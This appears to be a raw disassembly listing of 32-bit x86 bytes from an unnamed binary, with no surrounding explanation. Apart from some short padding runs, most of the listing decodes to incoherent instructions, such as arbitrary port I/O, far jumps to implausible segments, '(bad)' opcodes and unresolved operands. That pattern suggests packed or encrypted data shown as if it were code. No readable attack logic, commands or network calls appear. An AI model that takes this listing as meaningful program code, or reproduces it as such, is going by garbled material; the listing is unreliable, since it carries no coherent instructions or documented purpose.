  4525a5:	add    BYTE PTR [ecx+eax*1+0x0],dh
  4525a9:	add    BYTE PTR [ecx+eax*1+0x0],ah
  4525ad:	add    BYTE PTR [ecx+eax*1+0x0],ah
  4525b1:	add    BYTE PTR [ecx+eax*1],dh
  4525b4:	add    BYTE PTR [eax],al
  4525b6:	xor    al,0x1
  4525b8:	add    BYTE PTR [eax],al
  4525ba:	and    al,0x1
  4525bc:	add    BYTE PTR [eax],al
  4525be:	and    al,0x1
  4525c0:	add    BYTE PTR [eax],al
  4525c2:	xor    al,0x1
  4525c4:	add    BYTE PTR [eax],al
  4525c6:	xor    al,0x1
  4525c8:	add    BYTE PTR [eax],al
  4525ca:	and    al,0x1
  4525cc:	add    BYTE PTR [eax],al
  4525ce:	and    al,0x1
  4525d0:	add    BYTE PTR [eax],al
  4525d2:	hlt    
  4525d3:	add    BYTE PTR [eax],al
  4525d5:	add    ah,dh
  4525d7:	add    BYTE PTR [eax],al
  4525d9:	add    ah,ah
  4525db:	add    BYTE PTR [eax],al
  4525dd:	add    ah,ah
  4525df:	add    BYTE PTR [eax],al
  4525e1:	add    ah,dh
  4525e3:	add    BYTE PTR [eax],al
  4525e5:	add    ah,dh
  4525e7:	add    BYTE PTR [eax],al
  4525e9:	add    ah,ah
	...
  45260b:	add    ah,ah
  45260d:	add    BYTE PTR [eax],al
  45260f:	add    BYTE PTR [eax+eax*1+0x170d0000],dh
  452616:	cld    
  452617:	dec    DWORD PTR ds:0xdfffc17
  45261d:	pop    ss
  45261e:	cld    
  45261f:	dec    DWORD PTR ds:0xdfffc17
  452625:	pop    ss
  452626:	cld    
  452627:	dec    DWORD PTR ds:0xdfffc17
  45262d:	pop    ss
  45262e:	cld    
  45262f:	dec    DWORD PTR ds:0xdfffc17
  452635:	mov    bh,0xa9
  452637:	push   0x33441553
  45263c:	add    al,0xec
  45263e:	popa   
  45263f:	ret    0x63fe
  452642:	sbb    al,bh
  452644:	or     eax,0x7bb3b28f
  452649:	cmp    edx,DWORD PTR ds:0xd5a5c501
  45264f:	sub    esp,DWORD PTR [eax+ebp*4+0x2a]
  452653:	iret   
  452654:	mov    ds:0x4c17f85a,eax
  452659:	lahf   
  45265a:	leave  
  45265b:	pop    esp
  45265c:	push   ss
  45265d:	adc    DWORD PTR [edx+edi*1+0x425cf2b8],0x9293a45
  452668:	and    eax,edx
  45266a:	out    0xd7,eax
  45266c:	repz add eax,0x3431
	...
  45268e:	leave  
  45268f:	jns    0x4526ec
  452691:	in     eax,dx
  452692:	xor    BYTE PTR [esi-0x2b],ah
  452695:	int    0x7a
  452697:	xchg   esp,eax
  452698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  452699:	les    ecx,FWORD PTR [eax-0x38]
  45269c:	je     0x452674
  45269e:	jle    0x452678
  4526a0:	or     al,0x65
  4526a2:	ins    DWORD PTR es:[edi],dx
  4526a3:	fsubr  st(2),st
  4526a5:	mov    esi,0xc95a1272
  4526aa:	icebp  
  4526ab:	call   edx
  4526ad:	push   ebx
  4526ae:	daa    
  4526af:	imul   DWORD PTR [ebp-0x2419b656]
  4526b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4526b6:	and    DWORD PTR [edi-0x5c46d8d6],edi
  4526bc:	icebp  
  4526bd:	or     edx,DWORD PTR [esi-0x1b0f2433]
  4526c3:	div    DWORD PTR [ecx+0x13]
  4526c6:	je     0x45269b
  4526c8:	mov    ch,0x64
  4526ca:	js     0x45268f
  4526cc:	and    bl,bl
  4526ce:	adc    ecx,edi
  4526d0:	jmp    0xc8af5689
  4526d5:	mov    eax,ds:0xf7c8089b
  4526da:	inc    ecx
  4526db:	pop    edi
  4526dc:	ja     0x45268b
  4526de:	stos   DWORD PTR es:[edi],eax
  4526df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4526e0:	leave  
  4526e1:	or     BYTE PTR [esi-0x478fcad4],0x30
  4526e8:	dec    ebp
  4526e9:	sbb    cl,bh
  4526eb:	popa   
  4526ec:	add    ebp,esp
  4526ee:	(bad)  
  4526ef:	adc    eax,0xcde3
	...
  452710:	xor    BYTE PTR [ebp-0x63830],0xc5
  452717:	lods   al,BYTE PTR ds:[esi]
  452718:	cwde   
  452719:	mov    ch,0x8e
  45271b:	fwait
  45271c:	pop    es
  45271d:	xchg   edi,eax
  45271e:	clc    
  45271f:	pop    es
  452720:	in     al,0x1f
  452722:	aas    
  452723:	leave  
  452724:	aad    0x98
  452726:	cmp    al,0xbe
  452728:	pusha  
  452729:	inc    ebp
  45272a:	pushf  
  45272b:	lea    esp,[edx-0x719214b7]
  452731:	mov    ebp,0x5b5402da
  452736:	ficomp WORD PTR [ebx-0x5d]
  452739:	popa   
  45273a:	aaa    
  45273b:	ret    0x875c
  45273e:	out    0x52,al
  452740:	jbe    0x4527ac
  452742:	jmp    eax
  452744:	aaa    
  452745:	add    edi,eax
  452747:	and    DWORD PTR [ebx+0x31],0x50
  45274b:	sbb    eax,0x981fdf24
  452750:	xlat   BYTE PTR ds:[ebx]
  452751:	push   esi
  452752:	jns    0x452726
  452754:	cmp    eax,0xb766b2c9
  452759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  45275a:	jmp    0x4526e2
  45275c:	outs   dx,DWORD PTR ds:[esi]
  45275d:	out    dx,eax
  45275e:	sub    ecx,edx
  452760:	je     0x452730
  452762:	outs   dx,BYTE PTR ds:[esi]
  452763:	add    ah,BYTE PTR [ecx]
  452765:	jnp    0x4527d2
  452767:	idiv   DWORD PTR [ebp+0x7e8e99c8]
  45276d:	mov    al,ds:0x12403eb1
  452772:	inc    eax
  452773:	in     al,0x0
	...
  452791:	add    BYTE PTR [edx+0x96b5457],bl
  452797:	call   0x9918:0xee55ee94
  45279e:	pop    ebp
  45279f:	mov    dl,BYTE PTR [edx-0x22]
  4527a2:	xor    esp,DWORD PTR [ecx-0x50]
  4527a5:	pop    ss
  4527a6:	or     al,0x46
  4527a8:	scas   eax,DWORD PTR es:[edi]
  4527a9:	ins    DWORD PTR es:[edi],dx
  4527aa:	sub    bl,BYTE PTR [edx+0x69]
  4527ad:	test   eax,0x815dd4c1
  4527b2:	dec    ebp
  4527b3:	sub    al,BYTE PTR [edx-0x430cfdf8]
  4527b9:	xchg   ecx,eax
  4527ba:	lahf   
  4527bb:	cli    
  4527bc:	sub    DWORD PTR ds:0xefcb1beb,esp
  4527c2:	add    edx,DWORD PTR [edx-0x2c3c588f]
  4527c8:	mov    esp,0x507030c4
  4527cd:	imul   ebp,DWORD PTR [edx+ecx*4-0x5b69636c],0x5e
  4527d5:	hlt    
  4527d6:	push   0xffffffab
  4527d8:	ret    
  4527d9:	add    al,ch
  4527db:	ss push ss
  4527dd:	aas    
  4527de:	and    al,0xa2
  4527e0:	xchg   esi,eax
  4527e1:	jecxz  0x45281a
  4527e3:	or     DWORD PTR [ebx],ecx
  4527e5:	push   esi
  4527e6:	clc    
  4527e7:	cmp    DWORD PTR fs:[eax+0x31a7663d],esi
  4527ee:	cmp    BYTE PTR [ecx+0x34],ch
  4527f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4527f2:	sub    al,0xd8
  4527f4:	and    ch,bh
	...
  452812:	add    BYTE PTR [eax],al
  452814:	add    ebp,DWORD PTR ds:0xdfa296de
  45281a:	clc    
  45281b:	mov    cl,0xf
  45281d:	sub    al,0xc3
  45281f:	out    0x58,eax
  452821:	jle    0x452852
  452823:	in     eax,dx
  452824:	jmp    DWORD PTR [edx]
  452826:	xor    DWORD PTR [edi-0x4ebf0a17],edx
  45282c:	pop    es
  45282d:	sbb    BYTE PTR [edx+0x474b6c36],ch
  452833:	jnp    0x452846
  452835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  452836:	jmp    0xea6a:0x17999cc8
  45283d:	ins    BYTE PTR es:[edi],dx
  45283e:	ins    BYTE PTR es:[edi],dx
  45283f:	mov    cl,0xbd
  452841:	fnstsw WORD PTR [ebx+0xb82fa49]
  452847:	je     0x45282e
  452849:	jns    0x45284d
  45284b:	popf   
  45284c:	pop    ecx
  45284d:	push   0xffffff98
  45284f:	jnp    0x4527d6
  452851:	and    ebp,DWORD PTR [ebx-0x6d5136e3]
  452857:	mov    ds,edi
  452859:	into   
  45285a:	imul   esp,DWORD PTR [ecx],0xffffff83
  45285d:	add    cl,BYTE PTR [eax+0x3e]
  452860:	xchg   esi,eax
  452861:	mov    WORD PTR [edi-0x72ea21df],ss
  452867:	jbe    0x45289d
  452869:	enter  0x256d,0x88
  45286d:	pusha  
  45286e:	bound  ebx,QWORD PTR [eax]
  452870:	or     eax,0xb1fd3581
  452875:	add    al,0xae
  452877:	mov    dh,0x0
	...
  452895:	add    BYTE PTR [ebx-0x4f3f645d],bh
  45289b:	mov    BYTE PTR [ebx],0xee
  45289e:	pop    ecx
  45289f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4528a0:	xchg   bl,ah
  4528a2:	mov    dh,0x52
  4528a4:	mov    DWORD PTR [ecx+0x72],eax
  4528a7:	adc    edx,DWORD PTR [ebx+0x75725d57]
  4528ad:	ret    
  4528ae:	or     al,al
  4528b0:	xchg   esi,eax
  4528b1:	xchg   BYTE PTR [edx-0x49f594f1],dh
  4528b7:	neg    eax
  4528b9:	push   cs
  4528ba:	and    BYTE PTR [edx+eax*8],ah
  4528bd:	lds    esp,FWORD PTR [edx+ecx*2]
  4528c0:	in     al,0xdf
  4528c2:	in     al,dx
  4528c3:	popf   
  4528c4:	sub    al,0xf4
  4528c6:	mov    BYTE PTR [ebp+0x2ff1d9e6],dh
  4528cc:	jp     0x452929
  4528ce:	mov    bh,BYTE PTR [ebx]
  4528d0:	retf   
  4528d1:	int3   
  4528d2:	fdiv   DWORD PTR [ebx+ebp*8+0x51]
  4528d6:	xchg   esi,eax
  4528d7:	ret    0x8a07
  4528da:	adc    eax,0x86ff4a78
  4528df:	and    bl,BYTE PTR [edx-0x3d]
  4528e2:	mov    eax,0xe351eb74
  4528e7:	shr    BYTE PTR [ecx+ecx*8],1
  4528ea:	test   eax,0x86306e74
  4528ef:	mov    cl,0xb
  4528f1:	mov    edi,DWORD PTR [ebx+0x1546850b]
  4528f7:	ja     0x45293b
  4528f9:	cld    
	...
  452916:	add    BYTE PTR [eax],al
  452918:	xchg   esi,eax
  452919:	test   eax,0x7fe38b1f
  45291e:	cmp    BYTE PTR [ebx-0x67],ch
  452921:	add    BYTE PTR [eax-0x253a9c1],al
  452927:	jmp    0xc5f0:0x8b59c7f4
  45292e:	mov    esp,0xeb7b58cc
  452933:	cmp    ecx,0xffffffdc
  452936:	test   BYTE PTR [ebp+0x15],al
  452939:	jns    0x45297d
  45293b:	loopne 0x4528c3
  45293d:	mov    ch,0xdf
  45293f:	mov    edi,DWORD PTR [eax]
  452941:	and    ah,bh
  452943:	push   eax
  452944:	or     DWORD PTR [ecx+0x52],edi
  452947:	in     al,0x96
  452949:	mov    ebp,0xa8458be3
  45294e:	cld    
  45294f:	dec    esp
  452950:	add    eax,0x96f84a79
  452955:	int    0xf7
  452957:	mov    ecx,DWORD PTR [edi-0x24]
  45295a:	cld    
  45295b:	inc    esp
  45295c:	add    eax,0x86e84279
  452961:	mov    ch,0xf7
  452963:	mov    ebx,esp
  452965:	(bad)  
  452967:	push   esp
  452968:	adc    eax,0x86f05279
  45296d:	mov    ebp,0x3c58bf7
  452972:	std    
  452973:	dec    esp
  452974:	adc    eax,0x4afc4a79
  452979:	mov    ebp,0xf3
	...
  45299a:	or     eax,0x4eb0000
  45299f:	jnp    0x4529f3
  4529a1:	hlt    
  4529a2:	mov    es,WORD PTR [edx-0x2]
  4529a5:	mov    al,bl
  4529a7:	sub    eax,DWORD PTR [ebp+eax*2-0xbb584cb]
  4529ae:	div    BYTE PTR [edi+0x7ad57317]
  4529b4:	push   edx
  4529b5:	lock xchg esi,eax
  4529b7:	add    bh,ch
  4529b9:	inc    esp
  4529ba:	add    eax,0xa7dc4279
  4529bf:	cmc    
  4529c0:	lods   al,BYTE PTR ds:[si]
  4529c2:	push   cs
  4529c3:	sar    bh,0x8a
  4529c6:	push   eax
  4529c7:	inc    esp
  4529c8:	dec    esi
  4529c9:	call   0x452b2b
  4529ce:	mov    ?,WORD PTR [ebx]
  4529d0:	or     eax,DWORD PTR [ebp-0x74eb5333]
  4529d6:	cmp    BYTE PTR [esp+eax*4],ch
  4529d9:	inc    ebp
  4529da:	in     eax,0xf6
  4529dc:	mov    al,0xc
  4529de:	cmp    eax,0x96ec4a79
  4529e3:	int3   
  4529e4:	jmp    0x452971
  4529e6:	dec    eax
  4529e7:	and    al,0x84
  4529e9:	add    al,0x9d
  4529eb:	add    al,BYTE PTR [ebx+0x8]
  4529ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4529ef:	hlt    
  4529f0:	test   BYTE PTR [ebp-0x63],cl
  4529f3:	cmp    BYTE PTR [esi-0x104b6bfc],0xeb
  4529fa:	jno    0x4529ee
  4529fc:	mov    edi,0x8b
	...
  452a19:	add    BYTE PTR [eax],al
  452a1b:	add    BYTE PTR [eax+0x59ccbcc4],ch
  452a21:	xor    ecx,ebx
  452a23:	int3   
  452a24:	push   ecx
  452a25:	xor    ecx,ebx
  452a27:	int3   
  452a28:	dec    ecx
  452a29:	xor    ecx,ebx
  452a2b:	int3   
  452a2c:	fdivr  DWORD PTR [edx-0x15]
  452a2f:	cmp    DWORD PTR [ecx+0x7],0xffffffe8
  452a33:	add    eax,0x89f82662
  452a38:	rcl    BYTE PTR [edi],1
  452a3a:	test   BYTE PTR [ebp+0x65],al
  452a3d:	iret   
  452a3e:	out    0x29,eax
  452a40:	dec    edx
  452a41:	es clc 
  452a43:	or     DWORD PTR [ecx-0x5],0xffffff9c
  452a47:	inc    esp
  452a48:	aaa    
  452a49:	ret    0x67ff
  452a4c:	jno    0x452a50
  452a4e:	inc    eax
  452a4f:	add    BYTE PTR [esi+0x2251e7b4],dl
  452a55:	or     al,0x44
  452a57:	cli    
  452a58:	into   
  452a59:	call   FWORD PTR [eax+ecx*2+0x69ffc217]
  452a60:	or     eax,0xd167ff9a
  452a65:	add    DWORD PTR [eax+0x0],eax
  452a68:	cli    
  452a69:	or     ecx,DWORD PTR [eax-0x6]
  452a6c:	dec    esi
  452a6d:	add    BYTE PTR [edi+0x423df545],al
  452a73:	cld    
  452a74:	or     eax,0xe6000000
  452a79:	test   DWORD PTR [ebp+edx*2+0x1bd81d1],0x0
	...
  452a9c:	add    BYTE PTR [eax],al
  452a9e:	xchg   esp,eax
  452a9f:	retf   
  452aa0:	sti    
  452aa1:	add    DWORD PTR [eax+0x24],0x7
  452aa5:	jae    0x452a93
  452aa7:	js     0x452aeb
  452aa9:	cld    
  452aaa:	xchg   ah,dh
  452aac:	or     BYTE PTR [esi+ecx*1-0x69af0040],0xcb
  452ab4:	out    0x52,eax
  452ab6:	call   0x8500:0x4efa440b
  452abd:	dec    ebp
  452abe:	mov    DWORD PTR [edi+0x3],esi
  452ac1:	(bad)  
  452ac2:	leave  
  452ac3:	sub    DWORD PTR [eax+eax*1],edi
  452ac6:	push   ax
  452ac8:	test   ch,ah
  452aca:	rol    BYTE PTR [eax-0x35],1
  452acd:	int3   
  452ace:	pop    ecx
  452acf:	xor    al,0xcb
  452ad1:	int3   
  452ad2:	push   ecx
  452ad3:	xor    al,0xcb
  452ad5:	int3   
  452ad6:	dec    ecx
  452ad7:	xor    al,0xcb
  452ad9:	int3   
  452ada:	mov    eax,0x6da1eb78
  452adf:	sub    bh,BYTE PTR [eax+eax*1]
  452ae2:	add    edi,DWORD PTR [ecx+0x3f]
  452ae5:	xor    BYTE PTR [esi-0x7bc1f84d],al
  452aeb:	mov    eax,0x344e5d07
  452af0:	retf   
  452af1:	int3   
  452af2:	push   ecx
  452af3:	xor    al,0xcb
  452af5:	int3   
  452af6:	dec    ecx
  452af7:	xor    al,0xcb
  452af9:	int3   
  452afa:	mov    eax,0x508beb78
  452aff:	hlt    
  452b00:	dec    edi
  452b01:	mov    eax,DWORD PTR [eax]
	...
  452b1f:	add    BYTE PTR [eax-0x8],dl
  452b22:	dec    esi
  452b23:	jmp    DWORD PTR [eax]
  452b25:	mov    esp,0xc30d43f5
  452b2a:	mov    esp,0xcb33d9cc
  452b2f:	int3   
  452b30:	shl    DWORD PTR [ebx],1
  452b32:	retf   
  452b33:	int3   
  452b34:	leave  
  452b35:	xor    ecx,ebx
  452b37:	int3   
  452b38:	cmp    BYTE PTR [ecx-0x15],bh
  452b3b:	cmp    DWORD PTR [ecx+0x370065f7],0x0
  452b42:	push   0xffc00edc
  452b47:	(bad)  
  452b48:	sbb    BYTE PTR [eax+0x770d43f5],bh
  452b4e:	inc    edx
  452b4f:	clc    
  452b50:	xor    eax,0xd3ffc18
  452b55:	jns    0x452b99
  452b57:	clc    
  452b58:	cmp    eax,0x8affb518
  452b5d:	and    al,0x7c
  452b5f:	les    edx,FWORD PTR ds:0x86fc4277
  452b65:	mov    dl,0xf
  452b67:	push   ecx
  452b68:	xchg   dl,cl
  452b6a:	or     edx,DWORD PTR [edx-0x6a]
  452b6d:	mov    edx,0xca625007
  452b72:	sti    
  452b73:	mov    esi,DWORD PTR [eax-0x3e]
  452b76:	mov    esp,0xeb78b8cc
  452b7b:	push   ecx
  452b7c:	push   edx
  452b7d:	mov    edx,0xd00fb
  452b82:	add    bl,ch
	...
  452ba0:	add    BYTE PTR [eax],al
  452ba2:	add    al,0x79
  452ba4:	inc    edx
  452ba5:	cld    
  452ba6:	mov    ?,WORD PTR [edi]
  452ba8:	dec    BYTE PTR [eax+0x4d8423d0]
  452bae:	and    eax,ebp
  452bb0:	dec    edx
  452bb1:	adc    BYTE PTR [esi+0x5558504],bl
  452bb7:	add    DWORD PTR [ebx-0x4],edx
  452bba:	sbb    ch,BYTE PTR [edx-0x3]
  452bbd:	mov    dl,BYTE PTR [eax-0xc]
  452bc0:	cld    
  452bc1:	dec    esp
  452bc2:	stc    
  452bc3:	repz mov cl,0x11
  452bc6:	ss ds jae 0x452bd1
  452bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  452bcb:	add    DWORD PTR [eax],eax
  452bcd:	add    BYTE PTR ds:0xbdeb0317,cl
  452bd3:	out    dx,eax
  452bd4:	mov    edi,0xbcc5e88b
  452bd9:	int3   
  452bda:	fnstenv [ebx+ecx*8]
  452bdd:	int3   
  452bde:	shl    DWORD PTR [ebx+ecx*8],1
  452be1:	int3   
  452be2:	leave  
  452be3:	xor    al,0xcb
  452be5:	int3   
  452be6:	pop    eax
  452be7:	ja     0x452bd4
  452be9:	mov    ecx,0x5
  452bee:	sub    DWORD PTR [edi+0x6],esi
  452bf1:	mov    DWORD PTR [eax],ecx
  452bf3:	pusha  
  452bf4:	cmc    
  452bf5:	inc    ebx
  452bf6:	or     eax,0x59ccbcc5
  452bfb:	xor    al,0xcb
  452bfd:	int3   
  452bfe:	push   ecx
  452bff:	xor    al,0xcb
  452c01:	int3   
  452c02:	dec    ecx
  452c03:	xor    al,0xcb
  452c05:	int3   
	...
  452c22:	add    BYTE PTR [eax],al
  452c24:	fdiv   DWORD PTR [esi-0x15]
  452c27:	cmp    DWORD PTR [ecx+0x10],0xffffff85
  452c2b:	inc    ebp
  452c2c:	adc    eax,0xd04777f
  452c31:	repz or DWORD PTR [eax-0x74fffff3],0xffffffd8
  452c39:	test   DWORD PTR [ecx+edx*2+0x8e57f09],0x5586165c
  452c44:	cmp    DWORD PTR [edi+0x42],esi
  452c47:	or     BYTE PTR [esi-0x3776f8c0],cl
  452c4d:	das    
  452c4e:	rol    BYTE PTR [ebp+0x19],0x0
  452c52:	add    BYTE PTR [eax],al
  452c54:	or     eax,0x588b0617
  452c59:	and    al,0x7c
  452c5b:	ror    DWORD PTR [ecx+edi*2],0x4a
  452c5f:	cld    
  452c60:	xchg   ah,cl
  452c62:	sti    
  452c63:	cmp    ebx,DWORD PTR [eax+0x2c]
  452c66:	ins    BYTE PTR es:[edi],dx
  452c67:	inc    esi
  452c68:	xchg   esi,eax
  452c69:	mov    esp,0x30508bfb
  452c6e:	or     BYTE PTR [edi-0x5413eff],dh
  452c74:	add    DWORD PTR [edi-0xb],edi
  452c77:	add    eax,DWORD PTR [eax-0x12]
  452c7a:	test   BYTE PTR [ebp-0x3f],al
  452c7d:	jbe    0x452cc9
  452c7f:	lock or ch,BYTE PTR [ebx+0x13]
  452c83:	inc    ecx
  452c84:	mov    WORD PTR ds:0xff8,ds
	...
  452ca6:	or     eax,0xa5558700
  452cab:	jbe    0x452cef
  452cad:	or     BYTE PTR [esi+0x5030bb4],al
  452cb3:	ja     0x452d07
  452cb5:	clc    
  452cb6:	xchg   esi,eax
  452cb7:	sti    
  452cb8:	push   cs
  452cb9:	add    ecx,eax
  452cbb:	jne    0x52bc320e
  452cc1:	or     al,0xe
  452cc3:	adc    DWORD PTR [ebp+0x378654d],eax
  452cc9:	or     dh,BYTE PTR [esi+0x58]
  452ccc:	test   BYTE PTR [ebp+0x5],dl
  452ccf:	ja     0x452d13
  452cd1:	or     BYTE PTR [esi],cl
  452cd3:	mov    esi,0xf7d08903
  452cd8:	out    0x6b,al
  452cda:	inc    edx
  452cdb:	and    bh,al
  452cdd:	mov    esi,DWORD PTR [eax]
  452cdf:	les    edi,FWORD PTR [esp+ecx*8-0x7c148928]
  452ce6:	cmp    ebx,ebx
  452ce8:	test   BYTE PTR [ebp+0x15],al
  452ceb:	jns    0x452d2f
  452ced:	in     al,0x86
  452cef:	mov    ah,0xe3
  452cf1:	mov    edi,DWORD PTR [eax+0x4950fc1b]
  452cf7:	ja     0x452d4b
  452cf9:	call   0x8c2ce894
  452cfe:	test   DWORD PTR [eax+0x770dffff],eax
  452d04:	dec    edx
  452d05:	lock mov fs,WORD PTR [ebx+0xef]
	...
  452d28:	adc    bh,BYTE PTR [esp+esi*8+0x0]
  452d2c:	or     eax,0x5558500
  452d31:	std    
  452d32:	push   edx
  452d33:	lock xchg esp,eax
  452d35:	retf   
  452d36:	fisttp WORD PTR [ebx+0x787c2048]
  452d3c:	sbb    eax,0xa8840900
  452d41:	add    BYTE PTR [eax],al
  452d43:	add    BYTE PTR [edi],dh
  452d45:	add    BYTE PTR [esi+0x0],ah
  452d48:	xchg   esi,eax
  452d49:	mov    bl,0xdf
  452d4b:	mov    eax,DWORD PTR [eax-0x8]
  452d4e:	cld    
  452d4f:	push   eax
  452d50:	add    esi,ecx
  452d52:	clc    
  452d53:	adc    eax,0x3c25d5
  452d58:	xchg   esp,eax
  452d59:	mov    ebx,0x1fd08bfb
  452d5e:	jl     0x452d98
  452d60:	or     eax,0xd88b16ac
  452d65:	pop    ds
  452d66:	test   BYTE PTR [ebp+0x15],dl
  452d69:	std    
  452d6a:	push   cs
  452d6b:	mov    eax,eax
  452d6d:	sub    eax,DWORD PTR [ebp+eax*2+0x84a756d]
  452d74:	push   cs
  452d75:	mov    eax,0x13d0890f
  452d7a:	in     al,0x17
  452d7c:	xchg   bl,cl
  452d7e:	fisttp WORD PTR [ebx+0x41fcf7c8]
  452d84:	std    
  452d85:	jbe    0x452dc9
  452d87:	hlt    
  452d88:	xchg   esi,eax
  452d89:	mov    bl,0xdf
  452d8b:	mov    eax,DWORD PTR [eax]
	...
  452da9:	add    al,al
  452dab:	idiv   esp
  452dad:	adc    BYTE PTR [ebx+ecx*8+0x2850c7eb],al
  452db4:	(bad)  
  452db5:	dec    DWORD PTR ds:0xed458500
  452dbb:	jl     0x452e34
  452dbd:	adc    BYTE PTR ds:0x588b08ac,cl
  452dc3:	and    BYTE PTR [ecx+edi*1+0xd],bh
  452dc7:	lods   al,BYTE PTR ds:[esi]
  452dc8:	add    bh,al
  452dca:	push   eax
  452dcb:	sub    dh,bh
  452dcd:	dec    DWORD PTR ds:0xc1558500
  452dd3:	jl     0x452e0a
  452dd5:	add    BYTE PTR [ecx],bh
  452dd7:	lahf   
  452dd8:	test   BYTE PTR [ebp-0x3f],al
  452ddb:	je     0x452de4
  452ddd:	sub    DWORD PTR [edi+edi*8-0x54720001],0x2c388b1b
  452de8:	test   BYTE PTR [edx],al
  452dea:	lock and al,bh
  452ded:	call   DWORD PTR [edx]
  452def:	rol    BYTE PTR [ebp+ecx*2-0x4a183177],1
  452df6:	and    BYTE PTR [eax],0xf8
  452df9:	adc    DWORD PTR [ecx-0x9],0xffffff86
  452dfd:	inc    ebp
  452dfe:	push   ecx
  452dff:	adc    al,0x1b
  452e01:	mov    eax,eax
  452e03:	sub    eax,DWORD PTR [edx+eax*1-0x72f84d6a]
  452e0a:	shl    edi,0xfd
  452e0d:	push   ecx
	...
  452e2a:	add    BYTE PTR [eax],al
  452e2c:	xchg   BYTE PTR [edx-0x77caaf05],bh
  452e32:	cli    
  452e33:	inc    DWORD PTR [edx+0x7c]
  452e36:	ret    
  452e37:	or     BYTE PTR [edx+edi*4+0x13c08bdb],al
  452e3e:	test   BYTE PTR [ebp+0x49],dl
  452e41:	jbe    0x452e51
  452e43:	mov    ecx,eax
  452e45:	sub    edi,DWORD PTR [eax+eax*8+0x11]
  452e49:	ja     0x452e8d
  452e4b:	hlt    
  452e4c:	xchg   BYTE PTR [edx+0x4cc83eb],dh
  452e52:	xchg   DWORD PTR [ebp-0xf],ecx
  452e55:	sub    edx,DWORD PTR [eax+0x7c20608b]
  452e5b:	ret    0x8919
  452e5e:	push   edx
  452e5f:	loopne 0x452e55
  452e61:	push   cs
  452e62:	stc    
  452e63:	jmp    edx
  452e65:	mov    esp,edx
  452e67:	pop    ebp
  452e68:	into   
  452e69:	dec    esp
  452e6a:	retf   
  452e6b:	int3   
  452e6c:	cmp    BYTE PTR [ebx+0x8b983eb],cl
  452e72:	push   0xffc00ef0
  452e77:	(bad)  
  452e78:	and    BYTE PTR [eax-0x76f2bc0b],dh
  452e7e:	inc    edx
  452e7f:	clc    
  452e80:	xor    eax,0xd3ffc1c
  452e85:	mov    eax,DWORD PTR [edx-0x8]
  452e88:	cmp    eax,0x92fd3928
  452e8d:	pop    ds
  452e8e:	jl     0x452e54
	...
  452eac:	add    BYTE PTR [eax],al
  452eae:	adc    eax,0x96fc4289
  452eb3:	int    0xf
  452eb5:	push   ecx
  452eb6:	xchg   BYTE PTR [ebp-0x3a79adf5],dh
  452ebc:	pop    es
  452ebd:	push   eax
  452ebe:	push   0xffffffb5
  452ec0:	sti    
  452ec1:	mov    ebp,DWORD PTR [eax-0x43]
  452ec4:	mov    esp,0xcb4c49cc
  452ec9:	int3   
  452eca:	mov    eax,0x79a1eb8a
  452ecf:	sbb    bh,BYTE PTR [eax+eax*1]
  452ed2:	dec    ebx
  452ed3:	add    BYTE PTR [eax-0x75],ch
  452ed6:	and    BYTE PTR [ebp+esi*8+0x43],ah
  452eda:	or     eax,0x5f014f89
  452edf:	inc    ebx
  452ee0:	xchg   DWORD PTR [eax+0x8],edx
  452ee3:	mov    ebp,0x4c49ccbc
  452ee8:	retf   
  452ee9:	int3   
  452eea:	mov    eax,0xf983eb8a
  452eef:	or     ebx,DWORD PTR [edi-0x3cf860]
  452ef5:	mov    bl,bh
  452ef7:	rol    dh,cl
  452ef9:	xchg   BYTE PTR ds:[edi-0x754074d1],bh
  452f00:	int    0x3e
  452f02:	xchg   esi,eax
  452f03:	(bad)  
  452f04:	or     ecx,DWORD PTR [ebx-0xbb57741]
  452f0a:	xchg   ah,al
  452f0c:	repz mov edx,DWORD PTR [ebp+0xc]
  452f10:	xchg   DWORD PTR [ebp+0x0],ecx
	...
  452f2f:	add    ch,al
  452f31:	mov    dl,BYTE PTR [edx-0x8]
  452f34:	test   BYTE PTR [ebx+edi*8+0xcb8],dh
  452f3b:	add    BYTE PTR [eax-0x71bb8cc1],dl
  452f41:	pushf  
  452f42:	test   DWORD PTR [eax],0xc02d0420
  452f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  452f49:	fild   DWORD PTR [ebp+ecx*2+0x184e8a85]
  452f50:	inc    esi
  452f51:	mov    ch,0x7
  452f53:	jne    0x452f69
  452f55:	mov    eax,DWORD PTR [edx-0x8]
  452f58:	xchg   ah,cl
  452f5a:	or     ecx,DWORD PTR [ecx+0x5584fbd5]
  452f60:	mov    al,BYTE PTR gs:[edx+0x10]
  452f64:	test   cl,al
  452f66:	pop    ss
  452f67:	mov    eax,0xc
  452f6c:	test   DWORD PTR ss:[ebp+ecx*2-0x76f175bb],0x458417e0
  452f78:	xor    eax,0xa0fc42da
  452f7d:	add    ebp,DWORD PTR ds:0xe50336c0
  452f83:	mov    bl,0xde
  452f85:	aas    
  452f86:	test   ch,ah
  452f88:	mov    al,0x42
  452f8a:	retf   
  452f8b:	int3   
  452f8c:	(bad)  [ebx+ecx*8-0x34]
  452f90:	ror    DWORD PTR [ebx+ecx*8-0x34],1
	...
  452fb0:	add    BYTE PTR [eax],al
  452fb2:	leave  
  452fb3:	dec    esp
  452fb4:	retf   
  452fb5:	int3   
  452fb6:	pop    eax
  452fb7:	mov    ebx,ebp
  452fb9:	cmp    ecx,0xfffffff8
  452fbc:	rol    BYTE PTR [ebp-0x1b],0x0
  452fc0:	xor    BYTE PTR [eax],al
  452fc2:	or     eax,0x4d0403a8
  452fc7:	add    BYTE PTR [edi-0x3e3874],bl
  452fcd:	dec    edi
  452fce:	mov    ch,0xb1
  452fd0:	sti    
  452fd1:	(bad)  
  452fd2:	mov    edx,0x8408c381
  452fd7:	ret    
  452fd8:	repz push 0x4d
  452fdb:	mov    DWORD PTR [edx-0x8],ecx
  452fde:	cmp    al,0x89
  452fe0:	adc    ch,BYTE PTR [edi+edx*4-0x3f]
  452fe4:	dec    DWORD PTR [edx+0x6a4fb04f]
  452fea:	or     eax,0xaef4521d
